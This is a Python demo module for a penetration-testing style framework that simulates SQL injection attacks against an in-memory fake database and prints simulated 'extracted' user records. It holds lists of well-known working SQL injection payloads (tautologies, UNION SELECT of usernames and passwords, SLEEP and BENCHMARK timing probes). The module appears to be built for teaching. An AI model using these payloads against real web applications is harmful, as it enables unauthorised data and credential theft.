from core.demo.base import Demo
from core.output_handler import print_success, print_error, print_info, print_status, print_empty
import time
import random

class SQLInjectionDemo(Demo):
    """SQL Injection demonstration module"""
    
    NAME = "SQL Injection Demo"
    DESCRIPTION = "Demonstration of different SQL injection techniques"
    PATH = "auxiliary/mysql/mysql_query"

    OPTIONS = {
        'target_url': {
            'description': 'Target URL (e.g., http://localhost/index.php)',
            'required': True,
            'type': 'str',
            'default': 'http://localhost/index.php'
        },
        'injection_type': {
            'description': 'Type of injection to demonstrate',
            'required': True,
            'type': 'str',
            'default': 'error_based',
            'choices': ['error_based', 'blind', 'time_based', 'union_based']
        },
        'parameter': {
            'description': 'Parameter to inject (e.g., id, username)',
            'required': True,
            'type': 'str',
            'default': 'id'
        }
    }

    def __init__(self):
        super().__init__()
        self.current_options = {
            'target_url': 'http://localhost/index.php',
            'injection_type': 'error_based',
            'parameter': 'id'
        }

        # Simulated database
        self.db = {
            'users': [
                {'id': 1, 'username': 'admin', 'password': 'admin123', 'email': 'admin@example.com', 'role': 'administrator'},
                {'id': 2, 'username': 'user', 'password': 'password123', 'email': 'user@example.com', 'role': 'user'},
                {'id': 3, 'username': 'guest', 'password': 'guest123', 'email': 'guest@example.com', 'role': 'guest'}
            ],
            'products': [
                {'id': 1, 'name': 'Product 1', 'price': 100, 'stock': 50},
                {'id': 2, 'name': 'Product 2', 'price': 200, 'stock': 30},
                {'id': 3, 'name': 'Product 3', 'price': 300, 'stock': 20}
            ]
        }
        
        # SQL injection payloads
        self.payloads = {
            'error_based': [
                "' OR '1'='1",
                "' OR 1=1--",
                "' OR '1'='1' --",
                "' OR '1'='1' #",
                "' OR '1'='1'/*",
                "' OR 1=1 UNION SELECT 1,2,3--",
                "' AND 1=CONVERT(int,(SELECT @@version))--"
            ],
            'blind': [
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND 'a'='a",
                "' AND 'a'='b",
                "' AND (SELECT 1 FROM users WHERE username='admin')=1--",
                "' AND (SELECT 1 FROM users WHERE username='admin' AND LENGTH(password)>5)=1--"
            ],
            'time_based': [
                "' AND (SELECT SLEEP(5))--",
                "' AND (SELECT BENCHMARK(10000000,MD5('a')))--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND SLEEP(5))>0--"
            ],
            'union_based': [
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT username,password,3 FROM users--",
                "' UNION SELECT 1,2,3,4,5 FROM users--",
                "' UNION SELECT NULL,NULL,NULL,NULL,NULL--"
            ]
        }

    def set_option(self, name: str, value: str) -> bool:
        """Set a module option"""
        if name not in self.OPTIONS:
            return False
        
        option = self.OPTIONS[name]
        
        # Check type
        if option['type'] == 'str':
            if not isinstance(value, str):
                return False
        
        # Check choices if specified
        if 'choices' in option and value not in option['choices']:
            return False
        
        # Check URL format for target_url
        if name == 'target_url' and not value.startswith(('http://', 'https://')):
            return False
        
        self.current_options[name] = value
        return True

    def get_options(self) -> dict:
        """Return current options"""
        return self.current_options

    def validate_options(self) -> bool:
        """Validate that all required options are set"""
        for name, option in self.OPTIONS.items():
            if option.get('required', False) and not self.current_options.get(name):
                return False
        return True

    def _simulate_delay(self, seconds):
        """Simulate a response delay"""
        time.sleep(seconds)
        return True

    def _simulate_error(self, payload):
        """Simulate SQL error based on payload"""
        if "CONVERT" in payload:
            return "Conversion failed when converting the varchar value 'Microsoft SQL Server' to data type int."
        elif "UNION" in payload:
            return "All queries in a SQL statement containing a UNION operator must have an equal number of expressions in their target lists."
        return "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use"

    def _simulate_query(self, payload, injection_type):
        """Simulate SQL query execution with injection"""
        if injection_type == 'error_based':
            if any(keyword in payload.upper() for keyword in ['UNION', 'CONVERT', 'CAST']):
                return {
                    'success': False,
                    'error': self._simulate_error(payload),
                    'data': None
                }
            return {
                'success': True,
                'data': self.db['users']
            }
        
        elif injection_type == 'blind':
            if "' AND 1=1" in payload:
                return {
                    'success': True,
                    'data': self.db['users'][0]
                }
            elif "' AND 1=2" in payload:
                return {
                    'success': True,
                    'data': None
                }
            elif "LENGTH(password)>5" in payload:
                return {
                    'success': True,
                    'data': self.db['users'][0]
                }
        
        elif injection_type == 'time_based':
            if "SLEEP" in payload or "BENCHMARK" in payload:
                self._simulate_delay(5)
                return {
                    'success': True,
                    'data': self.db['users'][0]
                }
        
        elif injection_type == 'union_based':
            if "UNION SELECT" in payload:
                if "username,password" in payload:
                    return {
                        'success': True,
                        'data': [{'username': user['username'], 'password': user['password']} for user in self.db['users']]
                    }
                else:
                    return {
                        'success': True,
                        'data': [{'1': 1, '2': 2, '3': 3}]
                    }
        
        return {
            'success': False,
            'error': 'Invalid query',
            'data': None
        }

    def run(self, options):
        """Execute SQL injection demonstration"""
        target_url = options['target_url']
        injection_type = options['injection_type']
        parameter = options['parameter']
        
        print_empty()
        print_status(f"SQL Injection demonstration on {target_url}")
        print_status(f"Injection type: {injection_type}")
        print_status(f"Target parameter: {parameter}\n")
        
        results = []
        for payload in self.payloads[injection_type]:
            print_status(f"Testing payload: {payload}")
            
            # Simulate query
            result = self._simulate_query(payload, injection_type)
            
            # Display results
            if result['success']:
                if result['data']:
                    print_success("Injection successful!")
                    if isinstance(result['data'], list):
                        print_success("Extracted data:")
                        for item in result['data']:
                            print_info(f"    {item}")
                    else:
                        print_success(f"Extracted data: {result['data']}")
                else:
                    print_error("Injection failed (no data)")
            else:
                print_error(f"Error: {result['error']}")
            
            print()
            results.append({
                'payload': payload,
                'success': result['success'],
                'data': result['data'] if result['success'] else None,
                'error': result.get('error')
            })
        
        return {
            'type': injection_type,
            'target_url': target_url,
            'parameter': parameter,
            'results': results
        } 